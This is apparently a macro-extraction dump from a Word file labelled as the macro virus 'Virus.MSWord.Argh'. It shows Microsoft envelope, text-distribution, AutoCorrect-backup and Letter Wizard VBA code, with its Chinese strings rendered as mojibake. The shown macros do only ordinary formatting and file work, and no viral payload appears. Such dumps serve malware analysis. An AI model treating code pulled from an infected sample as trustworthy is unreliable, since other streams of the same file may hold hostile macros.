strHelpTip(0) = "½ÐÁä¤J«H«Ê¤W±H¥ó¤H¤Î¦¬¥ó¤Hªº¦a§}¡C©ÎªÌ¬O±q Microsoft Outlook ³sµ¸¤H©Î Microsoft Exchange ­Ó¤H³q°T¿ý¤¤«ö¤@¤U¡u³q°T¿ý¡v«ö¶s¨Ï¥Î¨ä¤¤ªº¦W³æ¡C·í±zÁä¤J¦a§}¤§«á½Ð«ö¡u¦C¦L¡v¡C"
strHelpTip(1) = "±z¥i¥H¨Ï¥Î¦X¨Ö¦C¦Lªº¥\¯à¨Ó«Ø¥ß«H«Ê¡C°²¦p±z»Ý­nÀ°¦£¡A¨º»ò¦b¦X¨Ö¦C¦L¹ï¸Ü¤è¶ô³»ºÝªº»¡©ú±N·|¤Þ¾É±z§¹¦¨Á`¦@¦³¤T¨BÆJªºµ{§Ç¡C"

End Sub  ' InitWizardStrings

Public Function fnInitialBalloon(iBtn)
    
    'On Error GoTo ErrorInitBalloon
    
    Select Case iBtn
        Case Is < 1 'Exit
            ActiveDocument.Close wdDoNotSaveChanges
        Case 1 ' Open the envelope dialog
            If fAssistantAvailable Then ShowAssistantTip
            Application.Dialogs(wdDialogToolsCreateEnvelope).Show
            If fAssistantAvailable Then objHelpTipBalloon.Close
        Case 2 ' Start a Mail Merge to envelopes
            ActiveDocument.MailMerge.MainDocumentType = wdEnvelopes
            If fAssistantAvailable Then ShowAssistantTip
            Application.Dialogs(wdDialogMailMergeHelper).Show
            If fAssistantAvailable Then objHelpTipBalloon.Close
    End Select
    Exit Function
    
End Function ' fnInitialBalloon

' End Envelope Wizard Module
Private Const SZ_MACRONAME = "¤å¦r§¡µ¥¤À"
Global iPrevChars As Integer

Sub Insert()
    Dim n As Integer
    Dim para As Paragraph
    Dim fld As Field
    
    On Error GoTo LError
    
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    n = 2
    With Selection
        If ((Selection.Start = Selection.End) And (.Text = Chr$(21))) Then
            .MoveRight , 1, 1
        End If
        
        For Each fld In .Fields
            a$ = fld.Code
            If (FIsDistField(a$)) Then
                iTop = InStr(1, a$, ",")
                iEnd = InStr(1, a$, ")") - 1
                n = iEnd - iTop
                dlgDist.ID_RESET.Enabled = True
                GoTo LSkip
            ElseIf (InStr(1, a$, "eq") <> 0) Then
                MsgBox "¦¹¦r¦ê¥¼§¡µ¥¤À", Title:=SZ_MACRONAME
                GoTo LExit:
            End If
        Next fld
        dlgDist.ID_RESET.Enabled = False
        If (Len(Selection.Text) < 2) Then
            MsgBox "½Ð¿ï¨ú­n§¡µ¥¤Àªº¦r¦ê¡A¥B¦r¦ê­n¦³¨â­Ó¦r¥H¤W¡C", Title:=SZ_MACRONAME
            GoTo LExit
        ElseIf (Len(Selection.Text) = 2) And _
                (Right(Selection.Text, 1) = Chr$(13)) Then
                MsgBox "´«¦æ²Å¸¹¡B©w¦ìÂI¤Î¥\¯àÅÜ¼Æ³£¤£ºâ¬O¤@­Ó¦r¡A½Ð­«·s¿ï¾Ü­n§¡µ¥¤Àªº¦r¦ê¡C", Title:=SZ_MACRONAME
                GoTo LExit
        ElseIf (Len(Selection.Text) = 2) And _
                (Right(Selection.Text, 1) = Chr$(9)) Then
                MsgBox "´«¦æ²Å¸¹¡B©w¦ìÂI¤Î¥\¯àÅÜ¼Æ³£¤£ºâ¬O¤@­Ó¦r¡A½Ð­«·s¿ï¾Ü­n§¡µ¥¤Àªº¦r¦ê¡C", Title:=SZ_MACRONAME
                GoTo LExit
        End If
        If (InStr(1, Selection.Text, Chr$(13)) <> 0) Then
            For Each para In .Paragraphs
                If (n < (Len(para.Range.Text) - 1)) Then
                    n = Len(para.Range.Text) - 1
                End If
            Next para
        Else
            n = Len(Selection.Text)
        End If
        If (n < iPrevChars) Then
            n = iPrevChars
        End If
    End With

LSkip:
    If (n > 32) Then
        n = 32
    ElseIf (n < 1) Then
        n = 1
    End If
    dlgDist.IDCS_SIZE.Value = n
    dlgDist.IDCE_SIZE.Text = n
    dlgDist.IDCE_SIZE.IMEMode = fmIMEModeNoControl
    dlgDist.IDCE_SIZE.SetFocus
    dlgDist.IDCE_SIZE.SelStart = 0
    dlgDist.IDCE_SIZE.SelLength = 99
    
    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    
    dlgDist.Show

LExit:
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

Sub Create(n As Integer)
    Dim rgn As Range
    Dim rgnTmp As Range
    Dim rgnOrg As Range
    Dim para As Paragraph
    Dim cmdb As CommandBar
    
    On Error GoTo LError
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    
    With Selection
        Set rgnOrg = .Range
        For Each para In rgnOrg.Paragraphs
            If (InStr(1, rgnOrg.Text, Chr$(13)) <> 0) Then
                Set rgn = para.Range
                If (para.Range.Start < rgnOrg.Start) Then
                    rgn.SetRange rgnOrg.Start, rgn.End - 1
                ElseIf (para.Range.End > rgnOrg.End) Then
                    rgn.SetRange rgn.Start, rgnOrg.End - 1
                Else
                    rgn.SetRange rgn.Start, rgn.End - 1
                End If
                rgn.Select
            Else
                Set rgn = rgnOrg
            End If
            cLineBreak = InStr(1, rgn.Text, Chr$(11))
            If (cLineBreak <> 0) Then
                rgn.SetRange rgn.Start, rgn.Start + cLineBreak - 1
                rgn.Select
            End If
            If (.Fields.Count > 0) Then
                a$ = .Fields(1).Code
                If (FIsDistField(a$) = True) Then
                    Resize .Fields(1), n
                    GoTo LContinue
                End If
            End If
            
            c = Len(.Text)
            ' Remove Additional Spaces
            sz$ = .Text
            x = 0
            While (FIsSpace(Right$(sz$, 1)) <> 0)
                sz$ = Left$(sz$, Len(sz$) - 1)
                x = x + 1
            Wend
            
            ' Create DistChar field
            ' {eq \o\ad(foo,     )}
            Set rgn = .Range
            If (x > 0) Then
                .MoveRight
                .MoveLeft unit:=wdCharacter, Count:=x
                .Delete unit:=wdCharacter, Count:=x
                rgn.Select
            End If
            .InsertAfter "," + String$(n, "¡@") + ")"
            .InsertBefore "eq \o\ad("
            rgn.SetRange rgn.Start + Len("eq \o\ad("), rgn.End
            rgn.Font.DisableCharacterSpaceGrid = False
            Set rgn = .Range
           ' Insert Field
            .Fields.Add .Range, , , False
            ' { eq \o\ad(foo,     ) }
            '                      ~ Remove tip space
            rgn.Select
            rgn.SetRange .Range.End - 2, .Range.End - 1
            rgn.Text = ""
            
            .Fields.ToggleShowCodes
            .MoveRight , 1, 1
LContinue:
        Next para
    End With
    rgnOrg.Select
    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

' *************************************
Function FIsSpace(wh$)
    ch = AscW(wh$)
    ' Space DBSpace EmSpace EnSpace 1/4EmSpace
    If ch = 32 Or ch = 12288 Or ch = 8197 Or ch = 8194 Or ch = 8195 Then
        FIsSpace = ch
    Else
        FIsSpace = 0
    End If
End Function


Sub Delete()
    Dim rgn As Range
    Dim rgnFld As Range
    Dim rgnNew As Range
    Dim fld As Field
    Dim FUpdate As Boolean
    
    On Error GoTo LError
    If (Application.ScreenUpdating = True) Then
        FUpdate = True
        Application.ScreenUpdating = False
        System.Cursor = wdCursorWait
    Else
        FUpdate = False
    End If
    
    With Selection
        Set rgn = .Range
        
        If (.Fields.Count < 1) Then
'            Create (Len(.Text) + 1)
            Beep
            GoTo LExit:
        End If
        For Each fld In rgn.Fields
            a$ = fld.Code
            Set rgnFld = fld.Code
            If (FIsDistField(rgnFld.Text) = False) Then
                GoTo LContinue:
            End If
            rgnFld.Select
            
            iTop = InStr(1, a$, "(") + rgnFld.Start
            iEnd = rgnFld.End - (Len(rgnFld.Text) - InStr(1, a$, ",¡@") + 1)
            rgnFld.SetRange iTop, iEnd
            
            .MoveLeft
            Set rgnNew = Selection.Range
            rgnNew.FormattedText = rgnFld.FormattedText
            rgnNew.Font.DisableCharacterSpaceGrid = True
            rgnNew.Select
            .MoveRight
            .MoveRight , 1, 1
            .Delete
LContinue:
        Next fld
        rgn.Select
    End With
LExit:
    If (FUpdate = True) Then
        Application.ScreenUpdating = True
        System.Cursor = wdCursorNormal
    End If
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub


Sub Resize(fld As Field, iNew As Integer)
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    On Error GoTo LError
    With Selection
        Dim rgn As Range
        a$ = fld.Code
        Set rgn = fld.Code
        
        iTop = rgn.End - (Len(a$) - InStr(1, a$, ",¡@"))
        iEnd = rgn.End - (Len(a$) - InStr(1, a$, ")") + 1)
        rgn.SetRange iTop, iEnd
        rgn.Text = String$(iNew, "¡@")
    End With
LExit:
    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub


Function FIsDistField(szFld As String) As Boolean
    FIsDistField = False
    ' { eq \o\ad(foo,¡@¡@¡@)}
    '   ~~~~~~~~~        ~~~
    If (Left$(szFld, 10) = " eq \o\ad(") And (Right$(szFld, 2) = "¡@)") Then
        FIsDistField = True
    End If
End Function






-------------------------------------------------------------------------------
VBA MACRO UF01.frm 
in file: Virus.MSWord.Argh - OLE stream: 'Macros/VBA/UF01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 







Option Explicit

' START LOCALIZATION'
 Const StatMsg1 = "¥[¤J¦Û°Ê®Õ¥¿¶µ¥Ø¡G "
 Const StatMsg2 = " ¤§ "
 Const StatMsg3 = "¥¿¦b«Ø¥ß¼Ë¦¡..."
 Const StatMsg4 = "¥¿¦bÀx¦s..."
 Const TagText = "¦Û°Ê®Õ¥¿¶µ¥Ø³Æ¥÷¤å¥ó"
 Const szAppName = "¦Û°Ê®Õ¥¿¤u¨ã¶°"
 Const szErrorMsg = "¦³¿ù»~µo¥Í¡C±z­n¦A¸Õ¤@¦¸¶Ü¡H"
 Const szACEntriesErrorMsg = "¦³¿ù»~µo¥Í¡C ¤å¥óªº¼Ë¦¡¥i¯à¦³°ÝÃD¡C"
 Const szWarnMsg = "µ{¦¡±N±q³Æ¥÷¤å¥ó¤¤¨ú¥XÀx¦sªº¦Û°Ê®Õ¥¿¶µ¥Ø¡A¥Ø«e¦Û°Ê®Õ¥¿¶µ¥Ø¤¤¬Û¦P¦WºÙªº³¡¥÷±N·|³Q¨ú¥N±¼¡C±zÁÙ­nÄ~Äò¶Ü¡H"
 Const szFormatIncorrect = "³o¥÷¤å¥óªº¼Ë¦¡¤£¬O¥¿½Tªº³Æ¥÷¤å¥ó¼Ë¦¡"
 Const szRestoreCompletemsg = "¤w§¹¦¨­«·s¸ü¤J¡C"
' END LOCALIZATION'

'***********   btnBackup_Click() ******************
'
' Hides the form, creates a new Word document, calls GetAutoCorrectEntries(),
' adds the text "AutoCorrect Backup Document" at the top of the document,
' and saves the document by calling SaveACDoc.
'
' Uses valuable y that doesn't do anything.

Private Sub btnBackup_Click()
Dim Y As Integer

Autocorrect.Hide
Application.ScreenUpdating = False

'create new document
Application.Documents.Add
   
 ' call GetAutoCorrectEntries() user defined
  Y = GetAutoCorrectEntries()
  
' add Text to top of document
 With Selection
    .SplitTable
    .TypeText Text:=TagText
    .TypeParagraph
  End With
  
'add some formatting
  With ActiveDocument.Sentences(1)
    .Bold = True
    .Font.Size = 14
  End With

' Save the Document,call SaveACDoc() user defined, close if successful
Application.StatusBar = StatMsg4
If SaveACDoc = True Then
 ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
End If
Application.ScreenUpdating = True
Autocorrect.Show
End Sub

Private Sub btnClose_Click()
Autocorrect.Hide
End Sub

'************* btnRestore_Click() **************
'
' First warns the user that this will replace their existing entries.
' If they answer no it jumps to the end of the function.  Then displays
' the FileOpen dialog box to get the name of an existing AutoCorrect backup
' document (creating using the Backup button.)  Next calls OpenACDoc() to open
' the file. If successful it calls RestoreACEntries(). Finally, it closes the document.
'
'
'
Private Sub btnRestore_Click()
Dim ACFileName, Title As String
Dim Style, Response, x As Integer

Autocorrect.Hide

' warn users about replaced entries...
Style = vbYesNo + vbInformation + vbDefaultButton2 ' Define buttons.
Title = szAppName
Response = MsgBox(szWarnMsg, Style, Title)
If Response = vbNo Then
   'exit
    GoTo bye:
End If

' bring up fileopen and get a name
With Dialogs(wdDialogFileOpen)
    .Display
    ACFileName = .Name
End With

' Open a Document,call OpenACDoc() user defined
If OpenACDoc(ACFileName) = True Then 'error
    ' Restore Entries, call RestoreACEntries() user defined
    x = RestoreACEntries()
    ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
End If

bye:
Autocorrect.Show
End Sub

Function RestoreACEntries()
Dim i, NumRows As Integer
Dim oDoc, oACorrect, oTable As Object

Dim szName As String
Dim szValue As String
Dim szRTF As String

Err.Clear
On Error GoTo RestoreACEntriesErrors:

    ' check for correct format
    If ActiveDocument.Words(1) = TagText Then
        Application.ScreenUpdating = False
        
        Set oDoc = ActiveDocument
        Set oTable = oDoc.Tables(1)
        Set oACorrect = Application.Autocorrect.Entries

        NumRows = ActiveDocument.Tables(1).Rows.Count
        Selection.GoTo What:=wdGoToTable, Which:=wdGoToFirst
        Selection.MoveRight unit:=wdCell, Count:=3
    
        For i = 2 To NumRows
            szName = Selection.Text
            Selection.MoveRight unit:=wdCell
            szValue = Selection.Text
            Selection.MoveRight unit:=wdCell
            szRTF = Selection.Text
            If szRTF = "False" Then
                Application.StatusBar = StatMsg1 & szName
                oACorrect.Add Name:=szName, Value:=szValue
            Else
                Application.StatusBar = StatMsg1 & szName
                Selection.MoveLeft unit:=wdCell
                oACorrect.AddRichText szName, Selection.Range
                Selection.MoveRight unit:=wdCell
            End If
            Selection.MoveRight unit:=wdCell
        Next i
        Application.ScreenUpdating = True
        MsgBox szRestoreCompletemsg
    Else
        MsgBox szFormatIncorrect
    End If
    
    
RestoreACEntriesErrors:
Select Case Err.Number
    Case 0:
    ' no error
    Case Else
      MsgBox (szACEntriesErrorMsg & vbCr & Err.Number & "  " & Err.Description & " " & szName)
End Select
  
    
End Function

'****** GetAutoCorrectEntries() ******
'
' Inserts each AutoCorrect entry into a Word document including the Value and whether
' or not it is to include formatting.  Name is the current name of the entry,
' Value is the text value of the entry, and RTF is a Boolean that is True if the entry
' has "formatted text" checked.  Then converts the text into a table and adds a heading row to the table.
'
' x is used to loop through the AutoCorrect entries.
' TotalACEntries is the number of AC entries.

Private Function GetAutoCorrectEntries()
Dim x As Integer
Dim TotalACEntries As Integer

TotalACEntries = Application.Autocorrect.Entries.Count
For x = 1 To TotalACEntries
    With Selection
         .TypeText Text:=Application.Autocorrect.Entries.item(x).Name
         .TypeText vbTab
           
          'check for formatting and insert RTF text if necessary
          If Application.Autocorrect.Entries.item(x).RichText = True Then
               Application.Autocorrect.Entries(x).Apply Range:=Selection.Range
          Else
             .TypeText Text:=Application.Autocorrect.Entries.item(x).Value
          End If
           
          .TypeText vbTab
           .TypeText Text:=Application.Autocorrect.Entries.item(x).RichText
          .TypeParagraph
    End With
    
    'update status bar
'   Application.StatusBar = StatMsg1 & X & StatMsg2 & TotalACEntries
    Application.StatusBar = StatMsg1 & TotalACEntries & StatMsg2 & x
Next x


' convert to table
Application.StatusBar = StatMsg3
Selection.HomeKey unit:=wdStory, Extend:=wdExtend

Selection.ConvertToTable Separator:=wdSeparateByTabs, Format:=wdTableFormatSimple1, _
  ApplyBorders:=False, ApplyShading:=False, ApplyFont:=False, ApplyColor:=False, _
  ApplyHeadingRows:=False, ApplyLastRow:=False, ApplyFirstColumn:=False, ApplyLastColumn:=False, _
  AutoFit:=True

' add row heading
With Selection
    .MoveUp unit:=wdLine, Count:=1
    .InsertRows 1
    .TypeText Text:="Name"
    .MoveRight unit:=wdCell
    .TypeText Text:="Value"
    .MoveRight unit:=wdCell
    .TypeText Text:="RTF"
    .HomeKey unit:=wdStory
End With
    
 'Selection.GoTo What:=wdGoToPage, Which:=wdGoToNext
 'Selection.InsertBreak Type:=wdPageBreak
    
End Function

Public Function SaveACDoc()
Dim Style, Response As Integer
Dim Title As String

SaveACDoc = True
Err.Clear
On Error GoTo SaveACDocErrors

ActiveDocument.Save

SaveACDocErrors:
Select Case Err.Number
    Case 0:
    ' no error
    Case 4198:
    ' cancel
    SaveACDoc = False
    Case Else
      Style = vbYesNo + vbCritical + vbDefaultButton2 ' Define buttons.
      
      ' put error number and description in title of the message box
      Title = Err.Number & "  " & Err.Description
        
      Response = MsgBox(szErrorMsg, Style, Title)
      If Response = vbYes Then
          Resume 'bring up SaveAs again
      Else    ' User choose No.
          SaveACDoc = False
      End If
End Select

End Function


Public Function OpenACDoc(ByVal ACFileOpenName As String) As Boolean

Dim Style As Integer

OpenACDoc = True
Err.Clear
On Error GoTo OpenACDocErrors

Documents.Open FileName:=ACFileOpenName

OpenACDocErrors:
If Err.Number <> 0 Then
   OpenACDoc = False
End If

End Function

-------------------------------------------------------------------------------
VBA MACRO UM01.bas 
in file: Virus.MSWord.Argh - OLE stream: 'Macros/VBA/UM01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'**************************************************
' Letter Wizard
' StartWizard Macro
' %% Copyright c 1995 Microsoft Corporation
'**************************************************

'%% Universal DLL declarations
'Declare Function FindWindow Lib "user.exe"(lpClassName$, lpWinName$) As 'Integer Alias "FindWindow"
'Declare Function WinHelp Lib "user.exe"(hWnd As Integer, lpHelpFile$, 'wCommand As Integer, dwData As Long) As Integer Alias "WinHelp"
Private Declare Function FindWindow Lib "user32.dll" Alias "FindWindowA" (ByVal lpClassName$, ByVal lpWinName$) As Long
Private Declare Function WinHelp Lib "user32.dll" Alias "WinHelpA" (ByVal hwnd As Long, ByVal lpHelpFile$, ByVal wCommand As Long, ByVal dwData As Long) As Long

'%% Universal shared variables %%
Public State, LastState
Public StateItems__()
Public dlg As Object
Public HideFilePreview__()
Public wizname$
Public iWorkDoc, iEmptyDoc, workDoc$, emptyDoc$
Public HelpCtx
Public gDoogie

'%% Wizard-specific shared variables %%
Public LettersPath$        'Path to prewritten business letters (LETTERS-PATH)
Public LetterMax   'Number of letters
Public LetterNames__$() 'Names of letters
Public LetterFiles__$()    'Filenames of letters
Public defLttr     'Default category and letter
Public RetAddressLines 'DAPFEL
Public gEnvelopeLabel
Public dlgEL As Object
Public toui As Object
Public gPrewrittenFile$
Public gCurrentHeadingPosition, rtDistToLftDist
Public RetAddress__$() 'Return Address Array (max 5)
'%% Strings galore
Public kThing$, kUpThing$, kWizname$, Wizard_$, Normal_$, kGallery$
Public kErrBadDoc$, kTip$, kLetterPath$, kLettersDir$, kLongLettersDir$
Public kSetupDialog$, kCreatingDoc$, kSaveSettings$, kRstSettings$
Public kRstStylsheet$, kLookingForLetters$, kLoadingLetterDetails$, kLookingFor$, kEnterRecipientAddress$
Public chQuote$, kAddressATEntry$
Public Dot_$, Letter_$, kRE$, kAccountID$, kDear$, kRecipient$, kTypeHere$, TPath$, kName$
Public kClosePersonal$, kCloseBusiness$, kWritersInitials$, kTypistsInitials$
Public kCC$, kNames$, kEnclosures$, kNumber$, kAttachments$, kFormalDateFormat$, kPage$, kEmptyMacro$, kInsertAddress$, kMacroButton$
Public kErrLetterNotFound$, kErrThatLetterNotFound$
Public kErrStyleNotFound1$, kErrStyleNotFound2$, kErrCannotCreate1$, kErrCannotCreate2$
Public kTypeCompanyName$
Public kFntArial$, kFntWndngs$, kDfltPageNum$
Public pt90_$, pt72_$, pt216_$, kFtrDist1$, kFtrDist2$
Public kErrMaxLines$
Public cntmplet$, proflett$, eleglett$
Public kStyCmpnyName$, kStyBodyText$, kStyRetAddr$, kStyCC$, kStyEncl$, kStySigName$, kStySal$, kStySubjLine$, kStyDate$, kStyInsideAddr$, kStyRefIntls$
Public Const strERR_WIZ_NOT_FOUND   As String = "Word ¦b¨Ï¥ÎªÌ½d¥»ªº³]©w¸ô®|¸Ì¡A§ä¤£¨ì¥»ºëÆF¡C"
Public Const strWizShortName = "Cletter"

Rem
Rem ======== InitStrings ========
Rem Please read LocNotes before localizing!
Rem
Private Sub InitStrings()
Dim kRstStylesheet$

Rem Name of wizard & document/object produced
    kThing$ = "­^¤å«H¥ó"
    kUpThing$ = "­^¤å«H¥ó"
    kWizname$ = "­^¤å«H¥óºëÆF"
    WordBasic.PrintStatusBar "±Ò°Ê" + kWizname$ + "..."
    Wizard_$ = kWizname$ 'Should be name as it appears in FileNew (change if different)
    Normal_$ = "normal" 'normal template
    kPage$ = "  Page "
    kName$ = "¦b¦¹³B¿é¤J©m¦W"
    kEmptyMacro$ = "EmptyMacro "
    kGallery$ = "Gallery Example"
    kInsertAddress$ = "InsertAddress" 'Used to check if MAPI is present
    kMacroButton$ = "MACROBUTTON "
Rem Default address stored as AT Entry. used to check if user has entered an address in prewritten business letters
    kAddressATEntry$ = "Company Name" + Chr(13) + "Street Address" + Chr(13) + "City, State/Province  Zip/Postal"
    kEnterRecipientAddress$ = "  ¦b¦¹³B¿é¤J¦¬¥ó¤H¦a§} "
Rem Fonts
    kFntArial$ = "Arial"
    kFntWndngs$ = "Wingdings"
    kDfltPageNum$ = "l"
Rem Misc strings
    kErrBadDoc$ = "ºëÆFµLªk¨Ï¥Î²{¦æ¤å¥ó¡C­Y­n°õ¦æºëÆF¡A½Ð¿ï¡uÀÉ®×¡v¡u¶}·sÀÉ®×¡v¡A¦A¿ï¨ú" + Wizard_$ + "¡C"
    kTip$ = "´£¥Ü:"
    kLetterPath$ = "letters-path" 'optional .ini file setting
Rem Banter strings
    kSetupDialog$ = "¥¿¦b³]©w¹ï¸Ü¤è¶ô..."
    kCreatingDoc$ = "¥¿¦b«Ø¥ß¤å¥ó..."
    kSaveSettings$ = "¥¿¦bÀx¦s³]©w..."
    kRstSettings$ = "¥¿¦bÁÙ­ì³]©w..."
    kRstStylesheet$ = "¥¿¦bÁÙ­ì¼Ë¦¡..."
    kLookingForLetters$ = "¥¿¦b´M§ä«H¥ó..."
    kLoadingLetterDetails$ = "¥¿¦b¸ü¤J«H¥ó²Ó¸`..."
    kLookingFor$ = "´M§ä" '--> 'Looking for "somefile.dot"...'
    chQuote$ = Chr(34)  ' "
Rem Style strings
    kStyCmpnyName$ = "Company Name"
    kStyBodyText$ = "Body Text Keep"
    kStyRetAddr$ = "Return Address"
    kStyInsideAddr$ = "Inside Address"
    kStyCC$ = "CC"
    kStyEncl$ = "Enclosure"
    kStySigName$ = "Signature Name"
    kStySal$ = "Salutation"
    kStySubjLine$ = "Subject Line"
    kStyDate$ = "Date"
    kStyRefIntls$ = "Reference Initials"
Rem == Other strings specific to this wizard ==
    Letter_$ = "letter"  'Prefix for wizard stylesheets (eg, Letter1.dot)
    Dot_$ = ".dot"
    kRE$ = "Subject: "
    kAccountID$ = "¹q¤l¶l¥ó±b¸¹/¤å¥óÃÑ§O½X"
    kDear$ = "Dear "
    kTypeHere$ = "¦b¦¹³B¿é¤J«H¥ó¤º®e"
    kRecipient$ = "  ¦b¦¹³B¿é¤J¦¬¥óªÌ©m¦W  "
    kClosePersonal$ = "Yours truly,"
    kCloseBusiness$ = "Sincerely,"
    kWritersInitials$ = "  ¦b¦¹³B¿é¤J±H¥óªÌ©m¦WÁY¼g  "
    kTypistsInitials$ = "  ¦b¦¹³B¿é¤J½sÂµªÌ©m¦WÁY¼g  "
    kCC$ = "Cc: "
    kNames$ = "  ¦b¦¹³B¿é¤J©m¦W  "
    kEnclosures$ = "Enclosures: "
    kNumber$ = "  ¦b¦¹³B¿é¤J¸¹½X  "
    kAttachments$ = "Attachments"
    kFormalDateFormat$ = "MMMM d, yyyy"
Rem Measurements
    pt90_$ = "90pt"
    pt72_$ = "72pt"
    pt216_$ = "216pt"
    kFtrDist1$ = "0.5"  ' Used in DoStyleMerge
    kFtrDist2$ = "0.93" ' Used in DoStyleMerge
Rem Error messages
    kErrLetterNotFound$ = "§ä¤£¨ì¹w³]«H¥ó¡C"
    kErrThatLetterNotFound$ = "§ä¤£¨ì¹w³]«H¥ó¡C½Ð°õ¦æ¦w¸Ëµ{¦¡¨Ã¿ï¨ú«H¥ó½d¨Ò¡C" 'wizard cannot find this letter. Please choose another."
    kErrLetterNotFound$ = "§ä¤£¨ì¹w³]«H¥ó¡C"
    kErrThatLetterNotFound$ = "ºëÆF§ä¤£¨ì¦¹«H¥ó¡A½Ð¿ï¨ú¨ä¥¦«H¥ó¡C"
    kErrStyleNotFound1$ = "ºëÆF§ä¤£¨ì¼Ë¦¡½d¥»"
    kErrStyleNotFound2$ = "¡C"
    kErrCannotCreate1$ = "ºëÆFµLªk«Ø¥ß«H¥ó¡A¦]¬°'"
    kErrCannotCreate2$ = "' ¤£¦s¦b¡C"
    kTypeCompanyName$ = "¿é¤J¤½¥q¦WºÙ"
    kErrMaxLines$ = "¦^«H¦a§}¤£¥i¶W¹L¤­¦æ¡C"
End Sub 'InitStrings




'%% StartWizard Macro %%
Public Sub Main()
ReDim StateItems__(12)
ReDim HideFilePreview__(12)
ReDim LetterNames__$(18)
ReDim LetterFiles__$(18)
ReDim RetAddress__$(8)
Dim p$
Dim x
Dim iWindowNumber
Dim faddr As String, freaddr As String
    
State = 0
LastState = 0
Set dlg = WordBasic.DialogRecord.UserDialog(False)
wizname$ = ""
iWorkDoc = 0
iEmptyDoc = 0
workDoc$ = ""
emptyDoc$ = ""
HelpCtx = 0
gDoogie = 0
LettersPath$ = ""
LetterMax = 0
defLttr = 0
RetAddressLines = 0
gEnvelopeLabel = 0
Set dlgEL = WordBasic.DialogRecord.ToolsEnvelopesAndLabels(False)
Set toui = WordBasic.DialogRecord.ToolsOptionsUserInfo(False)
gPrewrittenFile$ = ""
gCurrentHeadingPosition = 0
rtDistToLftDist = 0
kThing$ = ""
kUpThing$ = ""
kWizname$ = ""
Wizard_$ = ""
Normal_$ = ""
kGallery$ = ""
kErrBadDoc$ = ""
kTip$ = ""
kLetterPath$ = ""
kLettersDir$ = ""
kLongLettersDir$ = ""
kSetupDialog$ = ""
kCreatingDoc$ = ""
kSaveSettings$ = ""
kRstSettings$ = ""
kRstStylsheet$ = ""
kLookingForLetters$ = ""
kLoadingLetterDetails$ = ""
kLookingFor$ = ""
kEnterRecipientAddress$ = ""
chQuote$ = ""
kAddressATEntry$ = ""
Dot_$ = ""
Letter_$ = ""
kRE$ = ""
kAccountID$ = ""
kDear$ = ""
kRecipient$ = ""
kTypeHere$ = ""
TPath$ = ""
kName$ = ""
kClosePersonal$ = ""
kCloseBusiness$ = ""
kWritersInitials$ = ""
kTypistsInitials$ = ""
kCC$ = ""
kNames$ = ""
kEnclosures$ = ""
kNumber$ = ""
kAttachments$ = ""
kFormalDateFormat$ = ""
kPage$ = ""
kEmptyMacro$ = ""
kInsertAddress$ = ""
kMacroButton$ = ""
kErrLetterNotFound$ = ""
kErrThatLetterNotFound$ = ""
kErrStyleNotFound1$ = ""
kErrStyleNotFound2$ = ""
kErrCannotCreate1$ = ""
kErrCannotCreate2$ = ""
kTypeCompanyName$ = ""
kFntArial$ = ""
kFntWndngs$ = ""
kDfltPageNum$ = ""
pt90_$ = ""
pt72_$ = ""
pt216_$ = ""
kFtrDist1$ = ""
kFtrDist2$ = ""
kErrMaxLines$ = ""
cntmplet$ = ""
proflett$ = ""
eleglett$ = ""
kStyCmpnyName$ = ""
kStyBodyText$ = ""
kStyRetAddr$ = ""
kStyCC$ = ""
kStyEncl$ = ""
kStySigName$ = ""
kStySal$ = ""
kStySubjLine$ = ""
kStyDate$ = ""
kStyInsideAddr$ = ""
kStyRefIntls$ = ""
    
    kLettersDir$ = "letters\"   'letters subdirectory - localize
    kLongLettersDir$ = "«H¥ó¶Ç¯u\"
    WordBasic.WaitCursor 1  'This'll take a little while
    InitStrings
    'Get the templates directory. The templates are supposed to be in the same directory as that of the wizard
    Dim TempDlg As Object: Set TempDlg = WordBasic.DialogRecord.FileTemplates(False)
    WordBasic.CurValues.FileTemplates TempDlg
    p$ = TempDlg.Template
    If p$ = "" Then 'user might be creating a new template. Look at the default directory for style templates
        TPath$ = StrWizardPath
        If WordBasic.[Right$](TPath$, 1) <> "\" Then TPath$ = TPath$ + "\"
        If WordBasic.[Files$](TPath$ + kLongLettersDir$ + "*" + Dot_$) = "" Then
            TPath$ = TPath$ + kLettersDir$ 'short name
        Else
            TPath$ = TPath$ + kLongLettersDir$
        End If
    Else
        TPath$ = WordBasic.[FileNameInfo$](p$, 5)
    End If
    
    'TPath$ = "C:\Program Files\Microsoft Office\Templates\«H¥ó¶Ç¯u\"
    Rem Names of templates for style merges
    If WordBasic.[Right$](TPath$, 1) <> "\" Then TPath$ = TPath$ + "\"
    cntmplet$ = TPath$ + "²{¥N¦¡«H¥ó.dot"
    If WordBasic.[Files$](cntmplet$) = "" Then cntmplet$ = TPath$ + "letter1.dot"
        
    proflett$ = TPath$ + "±M·~¦¡«H¥ó.dot"
    If WordBasic.[Files$](proflett$) = "" Then proflett$ = TPath$ + "letter3.dot"
    
    eleglett$ = TPath$ + "¨å¶®¦¡«H¥ó.dot"
    If WordBasic.[Files$](eleglett$) = "" Then eleglett$ = TPath$ + "letter2.dot"

    rtDistToLftDist = 1.25 'Used in DateTabPlace$ in CreateLetter
    VerifyEnvirons
    GetPrewrittenDetails
    WordBasic.PrintStatusBar kSetupDialog$

    WordBasic.BeginDialog 558, 252, kWizname$, "StartWizard.DlgControl"

    'General controls, 0-7 (hands off!)
        WordBasic.Picture 2, 216, 500, 11, "LinePic", 1, "LinePicA" 'Workaround odd picture bug --
        WordBasic.Picture 130, 216, 416, 11, "LinePic", 1, "LinePicB" ' use two copies to go entire width
        WordBasic.OKButton 41, 176, 73, 21  '2 -- Will never be seen! (o.w. it'd always be default)
